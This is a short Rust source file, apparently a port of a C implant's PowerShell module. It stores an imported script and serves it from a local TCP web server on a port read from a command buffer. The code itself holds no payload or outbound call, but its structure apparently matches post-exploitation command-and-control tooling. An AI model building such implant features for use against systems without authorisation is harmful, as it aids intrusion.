//! Port of powershell.cpp — imported PowerShell script hosting.

use crate::parse::DataP;
use crate::webserver::serveit;
use parking_lot::Mutex;

/// Track our imported script data (imported). None = no script imported yet.
static IMPORTED: Mutex<Option<Vec<u8>>> = Mutex::new(None);

/// Import a script that we'll use for awhile.
pub fn command_psh_import(buffer: &[u8], length: usize) {
    let mut imported = IMPORTED.lock();

    // alloc some memory and copy our data over
    let mut script = Vec::with_capacity(length + 1);
    script.extend_from_slice(&buffer[..length]);
    script.push(0); // NUL terminate (C: imported[length] = '\0')

    *imported = Some(script);

    // that's it... now we'll need to serve this in a local web server
}

/// Host the imported script on a local TCP web server.
pub fn command_psh_host_tcp(buffer: &[u8], length: usize) {
    let mut data = buffer[..length].to_vec();
    let mut parser = DataP::init(&mut data);
    let port = parser.data_short();

    let imported = IMPORTED.lock();
    let script = match imported.as_deref() {
        Some(s) => s,
        None => return, // C: if (imported == NULL) return;
    };

    // serve strlen(imported) bytes (up to the NUL terminator)
    let slen = script.iter().position(|&c| c == 0).unwrap_or(script.len());
    serveit(port, &script[..slen], slen as i32);
}
